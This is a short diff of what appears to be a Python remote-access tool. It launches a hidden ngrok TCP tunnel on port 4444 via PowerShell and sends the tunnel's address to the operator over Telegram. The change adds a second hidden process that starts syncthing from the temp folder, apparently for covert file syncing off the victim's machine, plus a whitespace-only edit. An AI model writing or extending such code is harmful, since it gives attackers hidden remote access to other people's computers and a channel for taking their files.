@@ -11,6 +11,7 @@ from comand import ngrok_send_Telegram
 
 # Start Process ngrok
 run = subprocess.run("powershell Start-Process $env:tmp\/ngrok 'tcp 4444' -WindowStyle Hidden")
+run = subprocess.run("powershell Start-Process $env:tmp\/syncthing -WindowStyle Hidden")
 time.sleep(4)
 # Send Telegram ip and port
 response = ngrok_send_Telegram()
@@ -21,7 +22,7 @@ def def_handler(sig, frame):
     print("[red][!][/red]  [yellow italic]Saliendo....[/yellow italic]\n\n")
     sys.exit(1)
 
-signal.signal(signal.SIGINT, def_handler)
+signal.signal(signal.SIGINT, def_handler) 
 
 option = options
 
